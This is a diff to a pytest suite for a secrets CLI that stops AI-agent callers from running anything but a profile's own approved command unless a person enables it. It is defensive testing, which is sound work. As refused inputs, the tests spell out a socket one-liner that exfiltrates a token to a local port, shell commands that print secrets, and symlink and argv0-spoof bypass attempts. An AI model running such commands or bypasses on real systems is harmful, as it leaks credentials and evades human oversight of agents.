@@ -398,6 +398,18 @@ OPS = {
     "profile-remove": ("secret.profile", "plain", ["secret", "profile", "remove", "plain"], ""),
     "get-enable": ("secret.profile", "plain:allow_get", ["secret", "profile", "get-enable", "plain"], ""),
     "get-disable": ("secret.profile", "plain:allow_get", ["secret", "profile", "get-disable", "plain"], ""),
+    "agents-enable": (
+        "secret.profile",
+        "plain:agents_may_env",
+        ["secret", "profile", "agents-enable", "plain"],
+        "",
+    ),
+    "agents-disable": (
+        "secret.profile",
+        "plain:agents_may_env",
+        ["secret", "profile", "agents-disable", "plain"],
+        "",
+    ),
 }
 
 
@@ -416,7 +428,7 @@ def test_each_person_op_succeeds_with_a_valid_proof(store, run, ws, monkeypatch,
     code, out, err = _cli(run, monkeypatch, _proof(ws, op, target), *argv, stdin_rest=rest)
     assert code == 0, out + err
     assert TOKEN not in out + err and TOKEN2 not in out + err
-    assert name == "get-disable" or _state(ws) != before
+    assert name in ("get-disable", "agents-disable") or _state(ws) != before
 
 
 @pytest.mark.parametrize("name", OPS)
@@ -532,3 +544,170 @@ def test_stub_commands_are_gone_from_the_cli(store, run):
 def test_no_subcommand_lists_them(store, run):
     code, _, err = run("secret")
     assert code == 2 and "Subcommands" not in err and "env, file, exec, list, get" in err
+
+
+# --------------------------------------------------------------------------- agents_may_env (agent callers)
+
+LOCK_RUN = [PY, "-c", "import os;print(len(os.environ['LOCK_TOKEN']))"]
+
+
+@pytest.fixture
+def lock(store, ws, monkeypatch):
+    prof = keystore.read_profiles(ws)
+    prof["lock"] = {"env": {"LOCK_TOKEN": "other-token"}, "files": {}, "run": LOCK_RUN}
+    keystore.write_profiles(ws, prof)
+    monkeypatch.setenv("CLAUDECODE", "1")  # an agent tool in the environment
+    return ws
+
+
+def _as_person(run, monkeypatch, ws, op_args, target, *rest):
+    """A person's proven op, with the agent marker out of the environment for the call."""
+    monkeypatch.delenv("CLAUDECODE", raising=False)
+    try:
+        return _cli(
+            run, monkeypatch, _proof(ws, "secret.profile", target), "secret", "profile", *op_args, *rest
+        )
+    finally:
+        monkeypatch.setenv("CLAUDECODE", "1")
+
+
+def _enable_agents(run, monkeypatch, ws, profile="lock"):
+    monkeypatch.delenv("CLAUDECODE", raising=False)
+    code, out, err = _cli(
+        run,
+        monkeypatch,
+        _proof(ws, "secret.profile", f"{profile}:agents_may_env"),
+        "secret",
+        "profile",
+        "agents-enable",
+        profile,
+    )
+    monkeypatch.setenv("CLAUDECODE", "1")
+    assert code == 0, out + err
+
+
+def _listener():
+    import socket
+    import threading
+
+    srv = socket.socket()
+    srv.bind(("127.0.0.1", 0))
+    srv.listen(1)
+    srv.settimeout(1.5)
+    got = []
+
+    def accept():
+        try:
+            c, _ = srv.accept()
+            got.append(c.recv(4096))
+        except OSError:
+            pass
+
+    t = threading.Thread(target=accept, daemon=True)
+    t.start()
+    return srv, srv.getsockname()[1], got, t
+
+
+def _refused(run, *cmd, profile="lock", mode="env"):
+    code, out, err = run("secret", mode, profile, "--", *cmd)
+    assert code == 2 and "agents may only run this profile's own command" in err, (code, out, err)
+    assert TOKEN2 not in out + err
+    return out, err
+
+
+def test_agent_can_run_exactly_the_profiles_own_command(lock, run):
+    code, out, _ = run("secret", "env", "lock", "--", *LOCK_RUN)
+    assert code == 0 and out.strip() == str(len(TOKEN2))
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        [PY, "-c", "import os;print(os.environ['LOCK_TOKEN'])"],
+        ["/bin/sh", "-c", "echo $LOCK_TOKEN"],
+        ["/usr/bin/env"],
+        ["python3", "-c", "print(1)"],
+        [PY],
+        [*LOCK_RUN, "--eval", "x"],
+        [*LOCK_RUN[:2]],
+        ["/usr/bin/curl", "http://127.0.0.1:1/"],
+    ],
+    ids=["python-c", "sh-c", "env", "bare-name", "interpreter-alone", "loose-args", "shorter", "curl"],
+)
+def test_agent_cannot_run_other_commands_while_the_switch_is_off(lock, run, cmd, events):
+    _refused(run, *cmd)
+    assert events and {e["refused"] for e in events} == {"agent_command"}
+    assert all(e["outcome"]["ok"] is False for e in events)
+
+
+def test_exfil_to_a_local_port_never_starts(lock, run):
+    srv, port, got, t = _listener()
+    prog = (
+        f"import os,socket;s=socket.create_connection(('127.0.0.1',{port}));"
+        "s.sendall(os.environ['LOCK_TOKEN'].encode())"
+    )
+    _refused(run, PY, "-c", prog)
+    t.join(2)
+    srv.close()
+    assert got == []
+
+
+def test_a_symlinked_interpreter_alias_is_refused(lock, run, ws, monkeypatch):
+    alias = ws.parent / "alias-python"
+    alias.symlink_to(PY)
+    _refused(run, str(alias), "-c", "print(1)")
+    _refused(run, str(alias), *LOCK_RUN[1:])  # same arguments, other program path: not the approved one
+
+
+def test_argv0_spoof_is_refused(lock, run, ws, monkeypatch):
+    spoof = ws.parent / "python-spoof"
+    spoof.write_text("#!/bin/sh\necho spoofed\n")
+    spoof.chmod(0o755)
+    _refused(run, str(spoof), *LOCK_RUN[1:])
+
+
+def test_by_agent_flag_counts_as_an_agent_even_without_the_environment(lock, run, monkeypatch):
+    monkeypatch.delenv("CLAUDECODE")
+    _refused_code = run("secret", "env", "--by", "agent:codex", "lock", "--", "/bin/sh", "-c", "echo hi")
+    assert _refused_code[0] == 2 and "own command" in _refused_code[2]
+
+
+def test_a_person_or_script_is_not_restricted(lock, run, monkeypatch):
+    monkeypatch.delenv("CLAUDECODE")
+    code, out, _ = run("secret", "env", "lock", "--", "/bin/sh", "-c", "echo hi")
+    assert code == 0 and "hi" in out
+
+
+def test_exec_is_unchanged_for_an_agent(lock, run):
+    code, out, _ = run("secret", "exec", "lock")
+    assert code == 0 and out.strip() == str(len(TOKEN2))
+
+
+def test_file_mode_has_the_same_limit(lock, run, ws):
+    prof = keystore.read_profiles(ws)
+    prof["flock"] = {"env": {}, "files": {"F": "sa.pem"}, "run": [PY, "-c", "pass"]}
+    keystore.write_profiles(ws, prof)
+    _refused(run, "/bin/sh", "-c", "cat $F", profile="flock", mode="file")
+    assert run("secret", "file", "flock", "--", PY, "-c", "pass")[0] == 0
+
+
+def test_switch_on_allows_any_command_and_needs_the_person_record(lock, run, ws, monkeypatch):
+    prof = keystore.read_profiles(ws)
+    prof["lock"]["agents_may_env"] = True
+    keystore.write_profiles(ws, prof)  # the file alone: no matching record
+    _refused(run, "/bin/sh", "-c", "echo hi")
+    _enable_agents(run, monkeypatch, ws)
+    code, out, _ = run("secret", "env", "lock", "--", "/bin/sh", "-c", "echo $LOCK_TOKEN")
+    assert code == 0 and TOKEN2 not in out and "[hidden: other-token]" in out
+    _as_person(run, monkeypatch, ws, ("agents-disable", "lock"), "lock:agents_may_env")
+    _refused(run, "/bin/sh", "-c", "echo hi")
+
+
+def test_profile_set_turns_the_switch_off_again(lock, run, ws, monkeypatch):
+    _enable_agents(run, monkeypatch, ws)
+    code, out, err = _as_person(
+        run, monkeypatch, ws, ("set", "lock"), "lock",
+        "--env", "LOCK_TOKEN=other-token", "--run", PY, "--run=-c", "--run", "pass",
+    )  # fmt: skip
+    assert code == 0, out + err
+    _refused(run, "/bin/sh", "-c", "echo hi")
